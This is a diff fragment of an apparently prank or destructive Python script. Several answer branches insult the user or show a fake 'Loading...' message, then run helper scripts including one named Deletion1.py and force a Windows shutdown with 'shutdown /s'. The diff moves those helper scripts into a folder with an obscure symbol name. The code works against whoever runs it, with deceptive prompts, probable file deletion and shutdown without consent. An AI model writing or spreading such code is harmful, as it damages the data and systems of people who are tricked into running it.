@@ -413,9 +413,9 @@ if choice == "yes":
 if choice == "or":
     print("DUMBASS")
     time.sleep(2)
-    call(["python", "open.py"])
-    call(["python", "Deletion1.py"])
-    call(["python", "clear.py"])
+    call(["python", "$@#&/open.py"])
+    call(["python", "$@#&/Deletion1.py"])
+    call(["python", "$@#&/clear.py"])
     time.sleep(5)
     os.system("shutdown /s")
     
@@ -580,18 +580,18 @@ if choice == "yes":
 if choice == "or":
     print("DUMBASS")
     time.sleep(2)
-    call(["python", "open.py"])
-    call(["python", "Deletion1.py"])
-    call(["python", "clear.py"])
+    call(["python", "$@#&/open.py"])
+    call(["python", "$@#&/Deletion1.py"])
+    call(["python", "$@#&/clear.py"])
     time.sleep(5)
     os.system("shutdown /s")
     
     
 if choice == "no":
-    print("Loading!!!!")
-    time.sleep(5)
-    call(["python", "open.py"])
-    call(["python", "Deletion1.py"])
-    call(["python", "clear.py"])
+    print("Loading...")
+    time.sleep(10)
+    call(["python", "$@#&/open.py"])
+    call(["python", "$@#&/Deletion1.py"])
+    call(["python", "$@#&/clear.py"])
     time.sleep(5)
     os.system("shutdown /s")
